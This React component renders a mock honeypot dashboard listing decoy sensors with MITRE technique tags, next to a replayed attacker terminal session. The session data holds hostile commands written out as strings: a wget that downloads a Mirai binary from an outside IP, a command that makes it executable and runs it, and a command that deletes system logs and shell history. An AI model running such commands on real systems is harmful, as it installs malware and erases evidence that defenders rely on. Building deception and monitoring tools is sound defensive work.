import React, { useState } from 'react';
import {
  Shield, Terminal, Server, Activity, AlertOctagon, Cpu, Database,
  RefreshCw, Lock, Eye, Search, Play, Copy, CheckCircle2, Flame
} from 'lucide-react';

const DECOY_FLEET = [
  { id: 'HP-COWRIE-01', name: 'Cowrie-SSH-Decoy', proto: 'SSH/Telnet (:22/:23)', ip: '103.148.92.14', hits: 4821, status: 'ONLINE', mitre: 'T1078 / T1059.004' },
  { id: 'HP-CONPOT-02', name: 'Conpot-ICS-SCADA', proto: 'Modbus/S7comm (:502)', ip: '103.148.92.19', hits: 612, status: 'ONLINE', mitre: 'T0855 / T0846' },
  { id: 'HP-DIONAEA-03', name: 'Dionaea-SMB-Trap', proto: 'SMB/RPC (:445)', ip: '103.148.92.22', hits: 1940, status: 'ONLINE', mitre: 'T1210 / T1570' },
  { id: 'HP-ELASTIC-04', name: 'ElasticPot-API', proto: 'HTTP (:9200)', ip: '103.148.92.31', hits: 1104, status: 'QUARANTINED', mitre: 'T1190' }
];

const TTY_LOGS = [
  { ts: '00:00.12', cmd: 'enable; system; shell; sh', tag: 'Botnet Init' },
  { ts: '00:01.04', cmd: 'cat /proc/cpuinfo | grep model', tag: 'T1082 Recon' },
  { ts: '00:02.41', cmd: 'wget http://185.220.101.44/bins/mirai.x86 -O /tmp/.x', tag: 'T1105 Ingress' },
  { ts: '00:03.19', cmd: 'chmod +x /tmp/.x && /tmp/.x ssh.scan', tag: 'T1222 Execution' },
  { ts: '00:04.55', cmd: 'rm -rf /var/log/* ~/.bash_history', tag: 'T1070 Defense Evasion' }
];

export default function AegisTrapSuite() {
  const [selectedDecoy, setSelectedDecoy] = useState(DECOY_FLEET[0]);

  return (
    <div className="min-h-screen bg-[#050811] text-slate-100 p-6">
      <div className="max-w-[1600px] mx-auto space-y-6">
        <div className="flex flex-wrap items-center justify-between gap-4 border-b border-slate-800 pb-4">
          <div>
            <span className="text-xs font-mono text-emerald-400 uppercase tracking-widest">
              ACTIVE DECEPTION & TELEMETRY SUITE
            </span>
            <h1 className="text-xl font-bold text-white mt-0.5">
              AEGISTRAP // HONEYPOT FLEET & TTY SESSION REPLAY
            </h1>
          </div>
          <div className="flex items-center gap-3 font-mono text-xs">
            <span className="px-3 py-1.5 rounded bg-emerald-500/15 text-emerald-300 border border-emerald-500/40">
              ACTIVE SENSORS: 18/19 ONLINE
            </span>
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
          {/* Decoy Fleet Cards */}
          <div className="lg:col-span-6 space-y-3">
            <h2 className="text-xs font-mono uppercase text-cyan-400">DEPLOYED DECOY CONTAINERS</h2>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
              {DECOY_FLEET.map(hp => (
                <div
                  key={hp.id}
                  onClick={() => setSelectedDecoy(hp)}
                  className={`p-4 rounded-xl border cursor-pointer transition ${
                    selectedDecoy.id === hp.id
                      ? 'bg-cyan-500/10 border-cyan-400/60'
                      : 'bg-[#090E1A] border-slate-800 hover:border-slate-700'
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <span className="font-mono text-xs text-cyan-300">{hp.id}</span>
                    <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-emerald-500/15 text-emerald-300">
                      {hp.status}
                    </span>
                  </div>
                  <div className="text-sm font-bold text-white mt-1.5">{hp.name}</div>
                  <div className="text-xs font-mono text-slate-400 mt-1">{hp.proto} // {hp.ip}</div>
                  <div className="flex items-center justify-between text-xs font-mono mt-3 pt-2 border-t border-slate-800/80">
                    <span className="text-rose-400">{hp.hits} Intercepts</span>
                    <span className="text-purple-300">{hp.mitre}</span>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Live TTY Session Replay */}
          <div className="lg:col-span-6 bg-[#090E1A] border border-slate-800 rounded-xl p-4">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3 mb-3">
              <div className="flex items-center gap-2">
                <Terminal className="w-4 h-4 text-emerald-400" />
                <span className="font-mono text-xs text-white font-semibold">
                  TTY REPLAY // {selectedDecoy.name} ({selectedDecoy.ip})
                </span>
              </div>
              <span className="text-[11px] font-mono text-rose-400">SRC: 185.220.101.44</span>
            </div>
            <div className="bg-[#04070D] border border-slate-800 rounded-lg p-3.5 font-mono text-xs space-y-2.5">
              {TTY_LOGS.map((line, i) => (
                <div key={i} className="flex items-start justify-between gap-2">
                  <div>
                    <span className="text-slate-500 mr-2">[{line.ts}]</span>
                    <span className="text-emerald-400">root@svr-prod-01:~#</span>{' '}
                    <span className="text-slate-100">{line.cmd}</span>
                  </div>
                  <span className="px-2 py-0.5 rounded text-[10px] bg-rose-500/15 text-rose-300 border border-rose-500/30 shrink-0">
                    {line.tag}
                  </span>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
